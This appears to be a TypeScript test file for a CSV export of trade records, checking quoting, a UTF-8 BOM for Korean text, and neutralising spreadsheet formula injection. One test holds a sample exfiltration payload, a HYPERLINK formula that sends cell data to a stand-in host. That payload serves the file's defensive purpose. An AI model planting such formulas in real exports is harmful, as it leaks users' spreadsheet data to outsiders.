// Trade-record CSV export (#181) - the pure conversion.
//
// The goal is a file that opens as is in both Excel and Google Sheets, which means two things to watch.
//
// 1) **A UTF-8 BOM** - without it Excel mangles Korean (Sheets is fine). So it is always added.
// 2) **Formula injection** - Excel and Sheets *execute* a cell starting with `=`, `+`, `-` or `@`.
//    Symbol names and reasons land in cells verbatim, so nothing may run the moment the file is opened.
import { describe, it, expect } from 'vitest';
import { CSV_BOM, csvCell, toCsv, type Column } from './export-csv';

interface Row {
  name: string;
  qty: number;
  ok: boolean;
  when: Date;
  note?: string | null;
}

const COLS: Column<Row>[] = [
  { header: '이름', value: (r) => r.name },
  { header: '수량', value: (r) => r.qty },
  { header: '여부', value: (r) => r.ok },
  { header: '시각', value: (r) => r.when },
  { header: '비고', value: (r) => r.note },
];

const row = (over: Partial<Row> = {}): Row => ({
  name: 'TQQQ',
  qty: 3,
  ok: true,
  when: new Date('2026-08-18T01:23:45.000Z'),
  ...over,
});

describe('csvCell — 한 칸 만들기', () => {
  it('평범한 값은 그대로', () => {
    expect(csvCell('TQQQ')).toBe('TQQQ');
    expect(csvCell(42)).toBe('42');
  });

  it('쉼표·따옴표·줄바꿈이 있으면 감싸고 따옴표는 두 번', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('그가 "말"했다')).toBe('"그가 ""말""했다"');
    expect(csvCell('첫 줄\n둘째 줄')).toBe('"첫 줄\n둘째 줄"');
  });

  it('빈 값은 빈 칸 — null·undefined 를 글자로 흘리지 않는다', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
    expect(csvCell('')).toBe('');
  });

  it('불리언은 사람이 읽는 말로', () => {
    expect(csvCell(true)).toBe('예');
    expect(csvCell(false)).toBe('아니오');
  });

  it('날짜는 초까지, 한국 시간으로', () => {
    // 2026-08-18T01:23:45Z = KST 10:23:45
    expect(csvCell(new Date('2026-08-18T01:23:45.000Z'))).toBe('2026-08-18 10:23:45');
  });

  // This is the heart of the file.
  describe('수식 주입 차단', () => {
    it.each(['=1+1', '+1', '-1', '@SUM(A1)'])('%s 는 수식으로 실행되지 않게 무력화한다', (v) => {
      const out = csvCell(v);
      expect(out.startsWith("'") || out.startsWith(`"'`)).toBe(true);
    });

    it('고전적인 공격 문자열도 막는다', () => {
      const attack = '=HYPERLINK("http://evil.test?"&A1,"클릭")';
      const out = csvCell(attack);
      expect(out).toContain("'=HYPERLINK");
      // It contains a quote, so it gets wrapped as well.
      expect(out.startsWith('"')).toBe(true);
    });

    it('탭·캐리지리턴으로 시작하는 위장도 막는다', () => {
      expect(csvCell('\t=1+1')).toContain("'");
      expect(csvCell('\r=1+1')).toContain("'");
    });

    it('음수는 숫자로 들어오면 건드리지 않는다 — 손익이 문자로 바뀌면 합계가 깨진다', () => {
      expect(csvCell(-1500)).toBe('-1500');
      expect(csvCell(-0.5)).toBe('-0.5');
    });
  });
});

describe('toCsv — 표 만들기', () => {
  it('BOM 으로 시작한다 — 엑셀 한글 깨짐 방지', () => {
    // Pinned by code point. If CSV_BOM were an empty string, startsWith would always be true and this would just pass
    // (which it once did - the route test caught it).
    expect(CSV_BOM).toBe('\ufeff');
    expect(CSV_BOM.charCodeAt(0)).toBe(0xfeff);
    expect(toCsv([row()], COLS).charCodeAt(0)).toBe(0xfeff);
  });

  it('머리글 다음에 행이 온다', () => {
    const lines = toCsv([row()], COLS).replace(CSV_BOM, '').trim().split('\r\n');
    expect(lines[0]).toBe('이름,수량,여부,시각,비고');
    expect(lines[1]).toBe('TQQQ,3,예,2026-08-18 10:23:45,');
  });

  it('행이 없어도 머리글은 남긴다 — 빈 파일을 받으면 실패인지 자료가 없는지 모른다', () => {
    const out = toCsv([], COLS).replace(CSV_BOM, '');
    expect(out.trim()).toBe('이름,수량,여부,시각,비고');
  });

  it('줄 끝은 CRLF — 엑셀이 기대하는 형식', () => {
    expect(toCsv([row()], COLS)).toContain('\r\n');
  });

  it('여러 행을 순서대로 담는다', () => {
    const out = toCsv([row({ name: 'A' }), row({ name: 'B' })], COLS).replace(CSV_BOM, '');
    const lines = out.trim().split('\r\n');
    expect(lines).toHaveLength(3);
    expect(lines[1].startsWith('A,')).toBe(true);
    expect(lines[2].startsWith('B,')).toBe(true);
  });

  it('셀 안의 줄바꿈이 행을 쪼개지 않는다', () => {
    const out = toCsv([row({ note: '첫 줄\n둘째 줄' })], COLS).replace(CSV_BOM, '');
    expect(out).toContain('"첫 줄\n둘째 줄"');
    // Outside quotes there are only two CRLFs: after the header and at the end of each row.
    expect(out.split('\r\n').filter(Boolean)).toHaveLength(2);
  });
});
